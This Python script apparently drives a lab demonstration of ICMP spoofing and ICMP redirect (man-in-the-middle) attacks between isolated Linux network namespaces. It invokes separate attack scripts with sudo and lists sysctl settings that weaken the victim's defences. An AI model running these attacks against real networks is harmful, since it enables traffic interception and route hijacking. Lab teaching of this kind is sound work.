#!/usr/bin/env python3
"""
Namespace Demo Script
====================

Demonstrates ICMP attacks using network namespaces for isolated testing.
Designed for lab environments with 'victim' and 'spoofed' namespaces.
"""

import subprocess
import time
import sys
from colorama import init, Fore, Style

init(autoreset=True)

def show_banner():
    """Display demo banner"""
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 70)
    print("           NAMESPACE-AWARE ICMP ATTACK DEMONSTRATION")
    print("=" * 70)
    print(f"{Style.RESET_ALL}")

def check_namespaces():
    """Check if required namespaces exist"""
    try:
        result = subprocess.run(['ip', 'netns', 'list'], capture_output=True, text=True)
        namespaces = result.stdout.strip().split('\n')
        
        required = ['victim', 'spoofed']
        available = []
        
        for line in namespaces:
            if line.strip():
                # Extract namespace name (e.g., "spoofed (id: 12)" -> "spoofed")
                ns_name = line.split()[0].strip()
                if ns_name in required:
                    available.append(ns_name)
        
        print(f"{Fore.YELLOW}Namespace Status:")
        for ns in required:
            if ns in available:
                print(f"  ✓ {ns} - Available")
            else:
                print(f"  ✗ {ns} - Missing")
        
        return len(available) == len(required)
        
    except Exception as e:
        print(f"{Fore.RED}Error checking namespaces: {e}")
        return False

def show_network_info():
    """Display network information for each namespace"""
    print(f"\n{Fore.CYAN}NETWORK INFORMATION:")
    
    namespaces = ['victim', 'spoofed']
    
    for ns in namespaces:
        print(f"\n{Fore.YELLOW}[{ns.upper()}]")
        
        # Get IP address
        try:
            cmd = ['ip', 'netns', 'exec', ns, 'ip', 'addr', 'show']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'inet ' in line and '192.168.100' in line:
                        ip = line.strip().split()[1].split('/')[0]
                        print(f"  IP: {ip}")
                        break
        except:
            print(f"  IP: Unknown")
        
        # Get interface
        try:
            cmd = ['ip', 'netns', 'exec', ns, 'ip', 'link', 'show']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'veth' in line and 'UP' in line and '@' in line:
                        interface = line.split(':')[1].strip().split('@')[0]
                        print(f"  Interface: {interface}")
                        break
        except:
            print(f"  Interface: Unknown")

def demo_spoof_attack():
    """Demonstrate ICMP spoofing attack"""
    print(f"\n{Fore.GREEN}{Style.BRIGHT}DEMO 1: ICMP SPOOFING ATTACK")
    print("=" * 50)
    
    # Configuration
    target = "192.168.100.2"  # victim
    source = "10.0.0.100"     # spoofed source
    namespace = "spoofed"     # attack from spoofed namespace
    
    print(f"{Fore.YELLOW}Configuration:")
    print(f"  Attack from: {namespace} namespace")
    print(f"  Target: {target} (victim)")
    print(f"  Spoofed source: {source}")
    
    print(f"\n{Fore.CYAN}Command that will be executed:")
    cmd = f"sudo python3 icmp_spoofer_raw.py {target} --source {source} --namespace {namespace}"
    print(f"  {cmd}")
    
    print(f"\n{Fore.YELLOW}Press Enter to execute or Ctrl+C to skip...")
    try:
        input()
        subprocess.run(cmd.split(), timeout=30)
    except KeyboardInterrupt:
        print(f"{Fore.RED}Skipped")
    except subprocess.TimeoutExpired:
        print(f"{Fore.YELLOW}Command timed out")

def demo_redirect_attack():
    """Demonstrate ICMP redirect attack"""
    print(f"\n{Fore.GREEN}{Style.BRIGHT}DEMO 2: ICMP REDIRECT ATTACK")
    print("=" * 50)
    
    # Configuration
    victim_ip = "192.168.100.2"    # victim namespace IP
    target_ip = "10.0.0.1"         # local target (simulated external)
    gateway_ip = "192.168.100.1"   # legitimate gateway
    fake_gateway = "192.168.100.3" # spoofed namespace IP (fake gateway)
    attack_ns = "spoofed"           # attack from spoofed namespace
    monitor_ns = "victim"           # monitor victim namespace
    
    print(f"{Fore.YELLOW}Configuration:")
    print(f"  Attack from: {attack_ns} namespace")
    print(f"  Monitor: {monitor_ns} namespace")
    print(f"  Victim: {victim_ip}")
    print(f"  Target: {target_ip}")
    print(f"  Real Gateway: {gateway_ip}")
    print(f"  Fake Gateway: {fake_gateway}")
    
    print(f"\n{Fore.CYAN}Command that will be executed:")
    cmd = (f"sudo python3 icmp_redirect_raw.py {victim_ip} {target_ip} {gateway_ip} "
           f"--fake-gateway {fake_gateway} --namespace {attack_ns} "
           f"--monitor-namespace {monitor_ns} --continuous --duration 30")
    print(f"  {cmd}")
    
    print(f"\n{Fore.YELLOW}Press Enter to execute or Ctrl+C to skip...")
    try:
        input()
        subprocess.run(cmd.split(), timeout=60)
    except KeyboardInterrupt:
        print(f"{Fore.RED}Skipped")
    except subprocess.TimeoutExpired:
        print(f"{Fore.YELLOW}Command timed out")

def show_monitoring_commands():
    """Show useful monitoring commands"""
    print(f"\n{Fore.BLUE}{Style.BRIGHT}MONITORING COMMANDS")
    print("=" * 50)
    
    print(f"{Fore.YELLOW}Monitor victim routing table:")
    print("  sudo ip netns exec victim watch -n 1 'ip route get 10.0.0.1'")
    
    print(f"\n{Fore.YELLOW}Monitor attack traffic:")
    print("  sudo ip netns exec spoofed tcpdump -i s-veth icmp -nn")
    
    print(f"\n{Fore.YELLOW}Monitor victim traffic:")
    print("  sudo ip netns exec victim tcpdump -i v-veth icmp -nn")
    
    print(f"\n{Fore.YELLOW}Test connectivity from victim:")
    print("  sudo ip netns exec victim ping -c 3 10.0.0.1")
    
    print(f"\n{Fore.YELLOW}Test local connectivity:")
    print("  sudo ip netns exec victim ping -c 3 192.168.100.3")
    print("  sudo ip netns exec spoofed ping -c 3 192.168.100.2")
    
    print(f"\n{Fore.YELLOW}Check namespace IPs:")
    print("  sudo ip netns exec victim ip addr show")
    print("  sudo ip netns exec spoofed ip addr show")

def show_setup_verification():
    """Show setup verification steps"""
    print(f"\n{Fore.BLUE}{Style.BRIGHT}SETUP VERIFICATION")
    print("=" * 50)
    
    print(f"{Fore.YELLOW}Required settings for successful attacks:")
    
    print(f"\n{Fore.CYAN}1. Disable RP filter:")
    print("  sudo ip netns exec victim sysctl net.ipv4.conf.all.rp_filter=0")
    print("  sudo ip netns exec victim sysctl net.ipv4.conf.v-veth.rp_filter=0")
    
    print(f"\n{Fore.CYAN}2. Enable ICMP redirects:")
    print("  sudo ip netns exec victim sysctl net.ipv4.conf.all.accept_redirects=1")
    print("  sudo ip netns exec victim sysctl net.ipv4.conf.v-veth.accept_redirects=1")
    
    print(f"\n{Fore.CYAN}3. Disable secure redirects:")
    print("  sudo ip netns exec victim sysctl net.ipv4.conf.all.secure_redirects=0")
    print("  sudo ip netns exec victim sysctl net.ipv4.conf.v-veth.secure_redirects=0")
    
    print(f"\n{Fore.CYAN}4. Enable IP forwarding (if doing MITM):")
    print("  sudo sysctl net.ipv4.ip_forward=1")

def main():
    """Main demo function"""
    show_banner()
    
    # Check prerequisites
    if not check_namespaces():
        print(f"\n{Fore.RED}Error: Required namespaces not found!")
        print("Please set up 'victim' and 'spoofed' namespaces first.")
        sys.exit(1)
    
    # Show network info
    show_network_info()
    
    # Show setup verification
    show_setup_verification()
    
    print(f"\n{Fore.GREEN}Choose a demonstration:")
    print("1. ICMP Spoofing Attack")
    print("2. ICMP Redirect Attack")
    print("3. Show Monitoring Commands")
    print("4. Exit")
    
    while True:
        try:
            choice = input(f"\n{Fore.YELLOW}Enter choice (1-4): ").strip()
            
            if choice == '1':
                demo_spoof_attack()
            elif choice == '2':
                demo_redirect_attack()
            elif choice == '3':
                show_monitoring_commands()
            elif choice == '4':
                print(f"{Fore.GREEN}Goodbye!")
                break
            else:
                print(f"{Fore.RED}Invalid choice. Please enter 1-4.")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.GREEN}Goodbye!")
            break
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")

if __name__ == '__main__':
    main() 